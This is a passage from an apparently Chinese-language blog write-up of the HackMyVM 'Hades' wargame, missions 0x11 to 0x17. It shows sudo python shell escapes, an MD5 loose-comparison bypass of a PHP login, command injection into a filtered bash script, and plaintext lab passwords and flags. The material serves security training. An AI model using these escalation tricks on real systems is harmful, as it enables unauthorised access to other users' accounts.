Your <span class="token environment constant">SHELL</span> is: /bin/rbash

djqWtkLisbQlrGtLYHCv</code></pre>
<p>???点就送?</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">cat</span> flagz.txt 
^ngXdULWFWKCGtgxAQNv^</code></pre>
<h2 id="MISSION-0x11"><a href="#MISSION-0x11" class="headerlink" title="MISSION 0x11"></a>MISSION 0x11</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x11 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user asteria is teaching us to program <span class="token keyword">in</span> python. 

<span class="token comment">## ES ##</span>
La usuaria asteria nos esta enseñando a programar en python.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> asia on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User asia may run the following commands on hades:
    <span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> asteria /usr/bin/python3 <span class="token parameter variable">-c</span> <span class="token string">'import os; os.system("/bin/sh")'</span>
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span>
$ ^<span class="token punctuation">[</span><span class="token punctuation">[</span>A^<span class="token punctuation">[</span><span class="token punctuation">[</span>A^C
$ <span class="token function">bash</span>
asteria@hades:/pwned/asia$ <span class="token builtin class-name">cd</span> ~
asteria@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-x--- <span class="token number">2</span> root    asteria <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root    root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> asteria asteria  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> asteria asteria <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> asteria asteria  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root    asteria   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root    asteria  <span class="token number">145</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rw-r----- <span class="token number">1</span> root    asteria  <span class="token number">161</span> Apr  <span class="token number">5</span> 06:36 sihiri_old.php
asteria@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> asteria* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/share/doc/asteria_pass.txt
/pwned/asteria
asteria@hades:~$ <span class="token function">cat</span> /usr/share/doc/asteria_pass.txt
hawMVJCYrBgoDAMVhuwT
asteria@hades:~$ <span class="token function">cat</span> flagz.txt 
^xSRhIftMsAwWvBAnqNZ^</code></pre>
<h2 id="MISSION-0x11-1"><a href="#MISSION-0x11-1" class="headerlink" title="MISSION 0x11"></a>MISSION 0x11</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x12 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user astraea believes <span class="token keyword">in</span> magic. 

<span class="token comment">## ES ##</span>
La usuaria astraea cree en la magia.
asteria@hades:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">cat</span> sihiri_old.php 

<span class="token operator">&lt;</span>?php
<span class="token variable">$pass</span> <span class="token operator">=</span> hash<span class="token punctuation">(</span><span class="token string">'md5'</span>, <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$pass2</span> <span class="token operator">=</span> hash<span class="token punctuation">(</span><span class="token string">'md5'</span>,<span class="token string">"ASTRAEA_PASS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
if<span class="token punctuation">(</span><span class="token variable">$pass</span> <span class="token operator">==</span> <span class="token variable">$pass2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
print<span class="token punctuation">(</span><span class="token string">"ASTRAEA_PASS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
else<span class="token punctuation">&#123;</span>
print<span class="token punctuation">(</span><span class="token string">"Incorrect ^^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
?<span class="token operator">></span></code></pre>
<p>md5弱比较</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token builtin class-name">cd</span> /var/www/html
asteria@hades:/var/www/html$ <span class="token function">ls</span>
id.zip  irene_auth.php  req.php  request.php  sihiri.php
asteria@hades:/var/www/html$ <span class="token function">curl</span> <span class="token number">127.0</span>.0.1/sihiri.php?pass<span class="token operator">=</span>s155964671a
nZkEYtjvHElOtupXKzTE</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">ssh</span> astraea@127.0.0.1
The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '</span>/pwned/asteria/.ssh<span class="token string">' (Permission denied).
Failed to add the host to the list of known hosts (/pwned/asteria/.ssh/known_hosts).

                                                      .     **                                   
                                                   *           *.                                 
                                                                  ,*                              
                                                                     *,                            
                                             ,                         ,*                         
                                          .,                              *,                       
                                       /                                    *                    
                                    ,*                                        *,                  
                                 /.                                            .*.                 
                                                                _____                     
                __     __           _____         ____________      _____\    \            _____   
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \  
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    | 
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/| 
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   || 
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/ 
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \      
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|     
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |     
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/      
                                                                        |___|/                     
        
                                       **                                    **.                    
                                          ,*                                **                       
                                             *,                          ,*                          
                                                *                      **                            
                                                *,                .*                              
                                                   *.           **                                 
                                                      **      ,*,                                 
                                                         ** *, 
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &amp;          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+

                                          
astraea@127.0.0.1'</span>s password: 
^KssHQIAFsxUamecyXIUk^
Connection to <span class="token number">127.0</span>.0.1 closed.</code></pre>
<h2 id="MISSION-0x12"><a href="#MISSION-0x12" class="headerlink" title="MISSION 0x12"></a>MISSION 0x12</h2><p>用密码登ssh连不上</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">astraea@hades.hackmyvm.eu's password: 
^KssHQIAFsxUamecyXIUk^
Connection to hades.hackmyvm.eu closed.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ ./busybox <span class="token function">netstat</span> <span class="token parameter variable">-tulnp</span>
netstat: can't scan /proc - are you root?
Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.11:38595        <span class="token number">0.0</span>.0.0:*               LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:6667          <span class="token number">0.0</span>.0.0:*               LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:80              <span class="token number">0.0</span>.0.0:*               LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:22              <span class="token number">0.0</span>.0.0:*               LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> :::1965                 :::*                    LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> :::80                   :::*                    LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> :::21                   :::*                    LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> :::22                   :::*                    LISTEN      -
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.11:56483        <span class="token number">0.0</span>.0.0:*                           -
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:44595           <span class="token number">0.0</span>.0.0:*                           -
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:55168           <span class="token number">0.0</span>.0.0:*                           -</code></pre>
<p>回到上一个用户，直接把别人传的工具拿来用，执行发现21端口开启了<br>用ftp登录astraea</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">ftp</span> astraea@127.0.0.1
Connected to <span class="token number">127.0</span>.0.1.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">57382</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>           <span class="token number">21</span> Apr 05 06:36 atalanta.txt
-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>           <span class="token number">22</span> Apr 05 06:36 flagz.txt
-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>          <span class="token number">181</span> Apr 05 06:36 mission.txt
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get flagz.txt
local: flagz.txt remote: flagz.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">43360</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> flagz.txt <span class="token punctuation">(</span><span class="token number">22</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>    <span class="token number">22</span>       <span class="token number">92.60</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">22</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">23.05</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get mission.txt
local: mission.txt remote: mission.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">42173</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> mission.txt <span class="token punctuation">(</span><span class="token number">181</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">181</span>      <span class="token number">521.40</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">181</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">252.15</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get atalanta.txt
local: atalanta.txt remote: atalanta.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">34197</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> atalanta.txt <span class="token punctuation">(</span><span class="token number">21</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>    <span class="token number">21</span>       <span class="token number">33.34</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">21</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">19.41</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> <span class="token builtin class-name">exit</span>
<span class="token number">221</span> Goodbye.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">cat</span> atalanta.txt 
mUcSNQlaXtwSvGcgeTYZ
asteria@hades:/var/tmp$ <span class="token function">cat</span> flagz.txt 
^nqTHTzMzDPDJrKPCfVR^
asteria@hades:/var/tmp$ <span class="token function">cat</span> mission.txt
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x13 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user atalanta has <span class="token keyword">done</span> something with our account. 

<span class="token comment">## ES ##</span>
La usuaria atalanta ha hecho algo con nuestra cuenta.</code></pre>
<h2 id="MISSION-0x13"><a href="#MISSION-0x13" class="headerlink" title="MISSION 0x13"></a>MISSION 0x13</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">cat</span> mission.txt
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x13 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user atalanta has <span class="token keyword">done</span> something with our account. 

<span class="token comment">## ES ##</span>
La usuaria atalanta ha hecho algo con nuestra cuenta.</code></pre>
<p>用上题拿到的密码登录atalanta</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">60</span>
drwxr-x--- <span class="token number">1</span> root     atalanta  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root     root      <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> atalanta atalanta   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> atalanta atalanta  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> atalanta atalanta   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root     atalanta    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root     atalanta   <span class="token number">237</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-r-sr-s--- <span class="token number">1</span> root     atalanta <span class="token number">16608</span> Apr  <span class="token number">5</span> 06:36 weird
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> atalanta atalanta    <span class="token number">21</span> Jun <span class="token number">12</span> 09:05 weird.c
atalanta@hades:~$ <span class="token function">cat</span> flagz.txt 
^XXZbDJTQQWCHJWTGeOw^</code></pre>
<h2 id="MISSION-0x14"><a href="#MISSION-0x14" class="headerlink" title="MISSION 0x14"></a>MISSION 0x14</h2><pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x14 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User athena lets us run her program, but she hasn't left us her <span class="token builtin class-name">source</span> code.

<span class="token comment">## ES ##</span>
La usuaria athena nos deja ejecutar <span class="token function">su</span> programa, pero no nos ha dejado <span class="token function">su</span> codigo fuente.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">cat</span> weird.c
kmQMpZsXgOsnzGReRcoV</code></pre>
<p>为什么直接给了密码?</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-x--- <span class="token number">2</span> root   athena <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> athena athena  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> athena athena <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> athena athena  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root   athena  <span class="token number">166</span> Apr  <span class="token number">5</span> 06:36 auri_old.sh
-rw-r----- <span class="token number">1</span> root   athena   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root   athena  <span class="token number">160</span> Apr  <span class="token number">5</span> 06:36 mission.txt
athena@hades:~$ <span class="token function">cat</span> flagz.txt 
^oGwmbNYdtHwJgznZdur^</code></pre>
<h2 id="Mission-0x15"><a href="#Mission-0x15" class="headerlink" title="Mission 0x15"></a>Mission 0x15</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################</span>
<span class="token comment"># MISSION 0x15 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User aura lets us use her new script.

<span class="token comment">## ES ##</span>
La usuaria aura nos deja utilizar <span class="token function">su</span> nuevo script.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> athena on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User athena may run the following commands on hades:
    <span class="token punctuation">(</span>aura<span class="token punctuation">)</span> NOPASSWD: /bin/bash <span class="token parameter variable">-c</span> /pwned/aura/auri.sh</code></pre>
<p>可以看到只有权限执行这个脚本的，看一下这个脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">cat</span> auri_old.sh 

<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
<span class="token builtin class-name">read</span> hackme
<span class="token comment">#Secure the condition!</span>
<span class="token comment">#if [[ $hackme =~ "????????" ]]; then</span>
<span class="token comment">#exit</span>
<span class="token comment">#fi</span>
<span class="token comment">#Add newest Aura pass!</span>
<span class="token comment">#$hackme AURANEWPASS 2>/dev/null</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> a.sh
<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
<span class="token builtin class-name">read</span> hackme
<span class="token comment">#Secure the condition!</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$hackme</span> <span class="token operator">=~</span> <span class="token string">"????????"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">exit</span>
<span class="token keyword">fi</span>
<span class="token comment">#Add newest Aura pass!</span>
<span class="token variable">$hackme</span> AURANEWPASS <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null  



 ~/Desktop                                                                                                                                                                                                            root@kali2  <span class="token number">17</span>:15:51 
<span class="token operator">></span> <span class="token function">bash</span> a.sh
What?
<span class="token builtin class-name">eval</span> <span class="token function">id</span><span class="token punctuation">;</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>我测试了半天能在kali上执行但是在靶机上就是执行不了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> aura /bin/bash <span class="token parameter variable">-c</span> /pwned/aura/auri.sh
What?
<span class="token builtin class-name">printf</span>
TiqpedAFjwmVyBlYpzRhathena@hades</code></pre>
<p>后来怀疑echo不行用了printf出来了密码，我到底要看看脚本里面写什么</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> auri.sh 

<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
<span class="token builtin class-name">read</span> hackme
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"e"</span>* <span class="token operator">||</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"o"</span>* <span class="token operator">||</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"?"</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">exit</span>
<span class="token keyword">fi</span>
<span class="token variable">$hackme</span> TiqpedAFjwmVyBlYpzRh <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>
<p>发现eo?都被过滤怪不得eval echo都不行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> flagz.txt 
^YFMNmPnlKNpnWiYOhYy^</code></pre>
<h2 id="MISSSION-0x16"><a href="#MISSSION-0x16" class="headerlink" title="MISSSION 0x16"></a>MISSSION 0x16</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x16 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User aegle has a good memory <span class="token keyword">for</span> numbers.

<span class="token comment">## ES ##</span>
La usuaria aegle tiene buena memoria para los numeros.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root aura  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> aura aura   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> aura aura  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> aura aura   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r-x--- <span class="token number">1</span> root aura   <span class="token number">160</span> Apr  <span class="token number">5</span> 06:36 auri.sh
-rw-r----- <span class="token number">1</span> root aura    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root aura   <span class="token number">168</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rw---x--- <span class="token number">1</span> root aura <span class="token number">16064</span> Apr  <span class="token number">5</span> 06:36 numbers</code></pre>
<p>就是猜数字呗，直到全对，1231239111126</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ ./numbers 
Enter one number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">2</span>
Number OK
Enter next number:
<span class="token number">3</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">2</span>
Number OK
Enter next number:
<span class="token number">3</span>
Number OK
Enter next number:
<span class="token number">9</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">1</span>
Number OK
Enter next number:
<span class="token number">2</span>
Number OK
Enter next number:
<span class="token number">6</span>
YRturIymmHSdBmEClEGe</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">cat</span> flagz.txt 
^XCwOqgVvWpDVwPVVUJa^</code></pre>
<h2 id="MISSSION-0x17"><a href="#MISSSION-0x17" class="headerlink" title="MISSSION 0x17"></a>MISSSION 0x17</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x17 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User calliope likes to have her things looked at.

<span class="token comment">## ES ##</span>
A la usuaria calliope le gusta que le miren sus cosas.
aegle@hades:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> aegle on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User aegle may run the following commands on hades:
    <span class="token punctuation">(</span>calliope<span class="token punctuation">)</span> NOPASSWD: /bin/cat
aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat calliope_pass.txt 
/bin/cat: calliope_pass.txt: Permission denied
aegle@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-x--- <span class="token number">2</span> root  aegle    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root  root     <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> aegle aegle     <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> aegle aegle    <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> aegle aegle     <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root  calliope   <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 calliope_pass.txt
-rw-r----- <span class="token number">1</span> root  aegle      <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root  aegle     <span class="token number">176</span> Apr  <span class="token number">5</span> 06:36 mission.txt
aegle@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> calliope* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/pwned/aegle/calliope_pass.txt
aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat /pwned/aegle/calliope_pass.txt
/bin/cat: /pwned/aegle/calliope_pass.txt: Permission denied</code></pre>
<p>密码不让读,只能直接读flag从平台拿密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat /pwned/calliope/flagz.txt 
^rFWOMwBJDidqSNtEJGJ^</code></pre>
